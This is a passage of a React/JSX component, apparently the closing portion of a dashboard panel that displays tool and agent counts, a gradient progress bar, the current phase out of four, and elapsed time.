                <div className="flex items-center gap-5 font-mono text-xs text-white/20">
                  <span>
                    tools: <span className="text-white/40">{currentStats.tools}</span>
                  </span>
                  <span>
                    agents: <span className="text-white/40">{currentStats.agents}</span>
                  </span>
                </div>
              </div>
            </>
          )}
        </div>
      </div>

      <div className="flex shrink-0 items-center justify-between gap-2 border-t border-white/[0.06] px-3 py-2 sm:px-5 sm:py-3">
        <div className="flex min-w-0 items-center gap-2 sm:gap-4">
          <div className="h-1.5 w-20 shrink-0 overflow-hidden rounded-full bg-white/[0.06] sm:w-36">
            <div
              className="h-full rounded-full bg-gradient-to-r from-[#77262d] to-[#c0444c] transition-all duration-500"
              style={{ width: `${currentPhase.progress}%` }}
            />
          </div>
          <span className="truncate font-mono text-xs text-white/25">
            {currentPhase.progress}% &mdash; Phase {activePhase} of 4
          </span>
        </div>
        <div className="hidden font-mono text-xs text-white/15 sm:block">elapsed: {currentPhase.elapsed}</div>
      </div>
    </div>
  );
}
